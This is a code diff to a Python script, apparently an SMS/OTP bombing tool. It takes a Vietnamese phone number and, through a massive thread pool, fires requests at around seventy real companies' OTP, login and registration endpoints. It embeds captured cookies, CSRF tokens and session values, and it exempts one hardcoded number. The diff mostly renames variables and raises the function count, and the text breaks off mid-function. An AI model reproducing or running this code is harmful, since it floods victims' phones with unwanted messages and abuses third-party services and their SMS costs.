@@ -16,22 +16,22 @@ except ImportError:
     os.system("pip install faker")
     os.system("pip install requests")
     os.system("pip install colorama")
-def run(phone):
-    for i in range(63):
-        threading.submit(globals()[f'VsTeamHttpRequests{i}'], phone)
+def run(sdt_vs):
+    for i in range(70):
+        threading.submit(globals()[f'VsTeamHttpRequests{i}'], sdt_vs)
 
-phone = sys.argv[1][:10]
+sdt_vs = sys.argv[1][:10]
 
-if not re.search(r"^0\d{9}$", phone):
+if not re.search(r"^0\d{9}$", sdt_vs):
     print("Số điện thoại không đúng định dạng")
     sys.exit()
-if phone == "0789531417":
+if sdt_vs == "0789531417":
     print("ngu")
     sys.exit()
 
 threading = ThreadPoolExecutor(max_workers=int(10000000000000000000000000000))
-def VsTeamHttpRequests0(phone):
-    url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
+def VsTeamHttpRequests0(sdt_vs):
+    VirusTeam_Url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
     cookies = {
         "TBMCookie_3209819802479625248": "837235001719489658Mp32H5wN7KdS1OPaqJx0N3Lf+as=",
         "___utmvm": "###########",
@@ -80,18 +80,18 @@ def VsTeamHttpRequests0(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "isReSend": "false",
     "sendOTPType": "1",
     "__RequestVerificationToken": "CfDJ8AFHr2lS7PNCsmzvEMPceBMU8Z1SuV_JJ3OBFK93wG3MRzQ7Kle82ApQBZ6EEPnibdyMm6YpFeOFTrJiCkPq4Petdv8oSXV-6q7lFFrJaeRkdKP52KMiBENGV63ob1sWd7QNcGBfksxZkj9NSWg3PEc"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests1(phone):
-    url = 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
+def VsTeamHttpRequests1(sdt_vs):
+    VirusTeam_Url = 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
     cookies = {
         "TBMCookie_3209819802479625248": "170329001719490827tgrxb2J/UkuRq4lU4tT7t0PAyhs=",
         "___utmvm": "###########",
@@ -130,18 +130,18 @@ def VsTeamHttpRequests1(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "isReSend": "false",
     "sendOTPType": "1",
     "__RequestVerificationToken": "CfDJ8LmkDaXB2QlCm0k7EtaCd5TIIAhR09EVIWI4JdQjT7GAxy25PeFzGqrQs_87FbV7YQxvzOxbF1xj3AJf5EdI6kQSTJHp3zU3TJOjbQUhbyjvoxMRl7PbsGiEp118U9jkpCzG5gl09nWpsTWYX53LDcY"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests2(phone):
-    url = 'https://api.dongplus.vn/api/user/send-one-time-password'
+def VsTeamHttpRequests2(sdt_vs):
+    VirusTeam_Url = 'https://api.dongplus.vn/api/user/send-one-time-password'
     headers = {
         "host": "api.dongplus.vn",
         "content-length": "23",
@@ -170,15 +170,15 @@ def VsTeamHttpRequests2(phone):
         "_clsk": "1cg2u8k%7C1719591746684%7C1%7C1%7Cp.clarity.ms%2Fcollect"
     }
     payload = {
-    "phone": phone
+    "phone": sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests3(phone):
-    url = 'https://vietteltelecom.vn/api/getOTPLoginCommon'
+def VsTeamHttpRequests3(sdt_vs):
+    VirusTeam_Url = 'https://vietteltelecom.vn/api/getOTPLoginCommon'
     cookies = {
         "laravel_session": "yKOWZ0THA6PeEJdoMmjoCwL2mlNisLjXPElI1nUH",
         "_fbp": "fb.1.1719534281684.442838623649907476",
@@ -211,18 +211,18 @@ def VsTeamHttpRequests3(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
     payload = {
-        "phone": phone,
+        "phone": sdt_vs,
         "typeCode": "DI_DONG",
         "actionCode": "myviettel://login_mobile",
         "type": "otp_login"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests4(phone):
-    url = 'https://vietteltelecom.vn/api/get-otp'
+def VsTeamHttpRequests4(sdt_vs):
+    VirusTeam_Url = 'https://vietteltelecom.vn/api/get-otp'
     cookies = {                                                                "laravel_session": "yKOWZ0THA6PeEJdoMmjoCwL2mlNisLjXPElI1nUH",
         "_fbp": "fb.1.1719534281684.442838623649907476",
         "__zi": "3000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NSqtr_JpqH9BtpY9_VgRMKZGEedqi9zPG9K-ZlUyarv0apC.1",
@@ -236,15 +236,15 @@ def VsTeamHttpRequests4(phone):
         "connection": "keep-alive",                                            "content-length": "41",
         "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",                                                  "x-xsrf-token": "eyJpdiI6IjZnSFVxRGZZcExkSGhaMVhyYkZWeEE9PSIsInZhbHVlIjoiZCtzNCtsaFhpN2R4dXVDbmFIZnlOZWxyU2hvSlE0V3hWdHVndlpuUExRdWIwb3B0OG42bGE4OHdSTGJiZ2xuaSIsIm1hYyI6IjVkN2FmMDhkOTNiM2ZlMjE3Y2I3MDIxZDIwODhjODE2ZTY0OWY0NDQ2OWNiNzMzYmQ5MTkyYjJlYzk4MzcwMjcifQ==",                     "x-csrf-token": "0V5x1EXBFxPwa4HMYNQ1mJTsVwwVbbT15mSQtL2V",            "sec-ch-ua-mobile": "?0",                                              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",                     "content-type": "application/json;charset=UTF-8",                      "accept": "application/json, text/plain, */*",                         "x-requested-with": "XMLHttpRequest",                                  "sec-ch-ua-platform": "\"Android\"",                                   "origin": "https://vietteltelecom.vn",                                 "sec-fetch-site": "same-origin",                                       "sec-fetch-mode": "cors",                                              "sec-fetch-dest": "empty",                                             "referer": "https://vietteltelecom.vn/dang-nhap",                      "accept-encoding": "gzip, deflate, br, zstd",                          "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"                                                             }
     payload = {
-        "msisdn": phone,
+        "msisdn": sdt_vs,
         "type": "register"                                                 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests5(phone):
-    url = f'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={phone}&languageCode=vi'
+def VsTeamHttpRequests5(sdt_vs):
+    VirusTeam_Url = f'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={sdt_vs}&languageCode=vi'
     cookies = {
         
     }
@@ -265,13 +265,13 @@ def VsTeamHttpRequests5(phone):
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests6(phone):
-    url = 'https://api.vieon.vn/backend/user/v2/register'
+def VsTeamHttpRequests6(sdt_vs):
+    VirusTeam_Url = 'https://api.vieon.vn/backend/user/v2/register'
     headers = {                                                                "host": "api.vieon.vn",
         "content-length": "202",
         "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
@@ -284,11 +284,11 @@ def VsTeamHttpRequests6(phone):
         "referer": "https://vieon.vn/auth/?destination=/&page=/",              "accept-encoding": "gzip, deflate, br, zstd",                          "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
         "priority": "u=1, i"
     }
-    payload = {"username": phone,"country_code":"VN","model":"Android 10","device_id":"eff5cb2895ec74651c58ff2013087140","device_name":"Chrome/126","device_type":"desktop","platform":"mobile_web","ui":"012021"}
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    payload = {"username": sdt_vs,"country_code":"VN","model":"Android 10","device_id":"eff5cb2895ec74651c58ff2013087140","device_name":"Chrome/126","device_type":"desktop","platform":"mobile_web","ui":"012021"}
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
-def VsTeamHttpRequests7(phone):
-    url = 'https://m.tv360.vn/public/v1/auth/get-otp-login'
+def VsTeamHttpRequests7(sdt_vs):
+    VirusTeam_Url = 'https://m.tv360.vn/public/v1/auth/get-otp-login'
     headers = {
         "host": "m.tv360.vn",
         "connection": "keep-alive",
@@ -310,11 +310,11 @@ def VsTeamHttpRequests7(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
         "cookie": "img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Awap_b4235ffa-9d7d-44cb-9808-610db15d8d84.%2BNvyCGaYKuINc7ZRziQ8alCRs5oEKq%2FywIwRqw%2FWvmM; shared-device-id=wap_b4235ffa-9d7d-44cb-9808-610db15d8d84; screen-size=s%3A784x1755.RfMBA3a0sbsth%2Fh8HYNTvVXWwMPjk%2FrvJ5vcRACFkSA; auto-login=s%3A1.E8d5%2BqHvtoRa81DxWMn1MgOyHoaIIEARCHxdA33Dyqw; session-id=s%3A380a3784-5751-46ac-918a-be53efc2d45a.S7ILmkxBplUth91IYUN5viSeYaScuR8k%2FTRtDjbDSwE; _ga=GA1.2.857869812.1719463278; _gid=GA1.2.280462909.1719463278; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS1.1.1719463277.1.1.1719463474.60.0.0; _ga_E5YP28Y8EF=GS1.1.1719463277.1.1.1719463474.0.0.0"
     }
-    payload = {"msisdn": phone}
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    payload = {"msisdn": sdt_vs}
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
-def VsTeamHttpRequests8(phone):
-    url = 'https://fptshop.com.vn/api-data/loyalty/Login/Verification'
+def VsTeamHttpRequests8(sdt_vs):
+    VirusTeam_Url = 'https://fptshop.com.vn/api-data/loyalty/Login/Verification'
     cookies = {
         "_gid": "GA1.3.1438213224.1719485307",
         "_gat": "1",
@@ -366,15 +366,15 @@ def VsTeamHttpRequests8(phone):
         "priority": "u=1, i"
     }
     payload = {
-    "phone": phone
+    "phone": sdt_vs
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests9(phone):
-    url = 'https://h5.vivohan.com/api/register/app/sendSms'
+def VsTeamHttpRequests9(sdt_vs):
+    VirusTeam_Url = 'https://h5.vivohan.com/api/register/app/sendSms'
     cookies = {
         "JSESSIONID": "9A9D7E5A5D678A1354355143AA67FE44"
     }
@@ -409,7 +409,7 @@ def VsTeamHttpRequests9(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
     payload = {
-    "phone": phone,
+    "phone": sdt_vs,
     "type": 2,
     "timestamp": 1719483862982,
     "referrer": "utm_source=e242",
@@ -423,10 +423,10 @@ def VsTeamHttpRequests9(phone):
     "uuid": "7a5e23b6e63755bfca7774ce004991d8",
     "pkg_name": "com.qcvivo.vivohanh5"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
-def VsTeamHttpRequests10(phone):
-    url = 'https://concung.com/ajax.html?sendOtpLogin'
+def VsTeamHttpRequests10(sdt_vs):
+    VirusTeam_Url = 'https://concung.com/ajax.html?sendOtpLogin'
     cookies = {
         "PHPSESSID": "ojm3it8kg64tf6t4nosi31jo99",
         "6f1eb01ca7fb61e4f6882c1dc816f22d": "T%2FEqzjRRd5g%3DiQyjVFpORMA%3DD9t74AxVdUc%3Dnv24LfYacp4%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8hPjWy%2Bvut0%3DE8Mp4wfZz74%3D",
@@ -467,20 +467,20 @@ def VsTeamHttpRequests10(phone):
     "ajax": "1",
     "classAjax": "AjaxLogin",
     "methodAjax": "sendOtpLogin",
-    "customer_phone": phone,
+    "customer_phone": sdt_vs,
     "id_customer": "0",
     "statictoken": "e633865a31fa27f35b8499e1a75b0a76",
     "captcha_key": "6b419e1337091c1dd8573538ae678d66",
     "momoapp": "0",
     "back": "khach-hang.html"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, data=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, data=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests11(phone):
-    url = 'https://api.tiki.vn/v2/customers/otp_codes'
+def VsTeamHttpRequests11(sdt_vs):
+    VirusTeam_Url = 'https://api.tiki.vn/v2/customers/otp_codes'
     cookies = {
         
     }
@@ -503,16 +503,16 @@ def VsTeamHttpRequests11(phone):
         "priority": "u=1, i"
     }
     payload = {
-        "phone_number": phone,
+        "phone_number": sdt_vs,
         "is_sso": True
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests12(phone):
-    url = 'https://api-crownx.winmart.vn/iam/api/v1/user/register'
+def VsTeamHttpRequests12(sdt_vs):
+    VirusTeam_Url = 'https://api-crownx.winmart.vn/iam/api/v1/user/register'
     cookies = {
         
     }
@@ -538,18 +538,18 @@ def VsTeamHttpRequests12(phone):
     }
     payload = {
         "firstName": "Tmr Virus",
-        "phoneNumber": phone,
+        "phoneNumber": sdt_vs,
         "masanReferralCode": "",
         "dobDate": "2003-09-23",
         "gender": "Male"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests13(phone):
-    url = 'https://kavaycash.com/verification/'
+def VsTeamHttpRequests13(sdt_vs):
+    VirusTeam_Url = 'https://kavaycash.com/verification/'
     cookies = {
         "csrftoken": "3LQmupWSSG26B6wUZoayi4GecXDKB6Gs3e1ZjIQl5EkttM9JoDthrHupLZSkqD3h",
         "_gcl_au": "1.1.1668310356.1719541325",
@@ -558,7 +558,7 @@ def VsTeamHttpRequests13(phone):
         "sw": "784",
         "sh": "1755",
         "agent": "Mozilla/5.0 (Linux",
-        "tel": phone,
+        "tel": sdt_vs,
         "app_process": "aqfEKOiYV8hnWWxEkid",
         "_gat_UA-216223731-3": "1",
         "_ga": "GA1.1.672424593.1719541325",
@@ -579,13 +579,13 @@ def VsTeamHttpRequests13(phone):
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
-    VirusTeam_PhanHoiTuWeb = requests.get(url, headers=headers, cookies=cookies, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.get(VirusTeam_Url, headers=headers, cookies=cookies, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests14(phone):
-    url = 'https://medicare.vn/api/otp'
+def VsTeamHttpRequests14(sdt_vs):
+    VirusTeam_Url = 'https://medicare.vn/api/otp'
     cookies = {
         "_gcl_au": "1.1.1095630110.1719546553",
         "_fbp": "fb.1.1719546558845.512164589940881992",
@@ -618,16 +618,16 @@ def VsTeamHttpRequests14(phone):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
     }
     payload = {
-        "mobile": phone,
+        "mobile": sdt_vs,
         "mobile_country_prefix": "84"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests15(phone):
-    url = "https://id.viettelpost.vn/Account/SendOTPByPhone"
+def VsTeamHttpRequests15(sdt_vs):
+    VirusTeam_Url = "https://id.viettelpost.vn/Account/SendOTPByPhone"
     payload = {
         "FormVerifyOtpModel.Phone": "",
         "FormVerifyOtpModel.Email": "",
@@ -639,7 +639,7 @@ def VsTeamHttpRequests15(phone):
         "FormRegister.FullName": "Tmr Virus ",
         "FormRegister.UserName": "",
         "FormRegister.Email": "",
-        "FormRegister.Phone": phone,
+        "FormRegister.Phone": sdt_vs,
         "FormRegister.ConfirmPhone": "False",
         "FormRegister.ConfirmEmail": "False",
         "FormRegister.RequiredPhone": "False",
@@ -716,13 +716,13 @@ def VsTeamHttpRequests15(phone):
         "_ga": "GA1.1.1174340557.1719534988"
     }
 
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests16(phone):
-    url = 'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp'
+def VsTeamHttpRequests16(sdt_vs):
+    VirusTeam_Url = 'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp'
     cookies = {
         "__Host-next-auth.csrf-token": "5ce831aaf39a45f51023bdb9a1b86295028c6ce931af4141f102da70bfaf6ba1%7C740bffb8a914710bef3618aff60a5155e7e3267f63b6cb50047f85136e248770",
         "__Secure-next-auth.callback-url": "https%3A%2F%2Fwww.lottemart.vn",
@@ -750,16 +750,16 @@ def VsTeamHttpRequests16(phone):
         "priority": "u=1, i"
     }
     payload = {
-        "username": phone,
+        "username": sdt_vs,
         "case": "register"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests17(phone):
-    url = 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp'
+def VsTeamHttpRequests17(sdt_vs):
+    VirusTeam_Url = 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp'
     cookies = {
         
     }
@@ -782,16 +782,16 @@ def VsTeamHttpRequests17(phone):
         "priority": "u=1, i"
     }
     payload = {
-        "phone": phone,
+        "phone": sdt_vs,
         "type": "register"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests18(phone):
-    url = 'https://api.onelife.vn/v1/gateway/'
+def VsTeamHttpRequests18(sdt_vs):
+    VirusTeam_Url = 'https://api.onelife.vn/v1/gateway/'
     headers = {
         'authority': 'api.onelife.vn',
         'accept': '*/*',
@@ -814,30 +814,30 @@ def VsTeamHttpRequests18(phone):
     payload = {
         'operationName': 'SendOTP',
         'variables': {
-            'phone': phone,
+            'phone': sdt_vs,
         },
         'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests19(phone):
+def VsTeamHttpRequests19(sdt_vs):
     headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
     response = requests.get('https://viettel.vn/dang-ky', headers=headers)
     token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
     headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
-    data = {'msisdn': phone}
+    data = {'msisdn': sdt_vs}
     response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
     result = response.json()
-def VsTeamHttpRequests20(phone):
+def VsTeamHttpRequests20(sdt_vs):
     cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
     headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
-    json_data = {'phone': phone,'type': '',}
+    json_data = {'phone': sdt_vs,'type': '',}
     response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
-def VsTeamHttpRequests21(phone):
-    url = 'https://products.popsww.com/api/v5/auths/register'
+def VsTeamHttpRequests21(sdt_vs):
+    VirusTeam_Url = 'https://products.popsww.com/api/v5/auths/register'
     headers = {
         'authority': 'products.popsww.com',
         'accept': '*/*',
@@ -863,18 +863,18 @@ def VsTeamHttpRequests21(phone):
 
     payload = {
         'fullName': '',
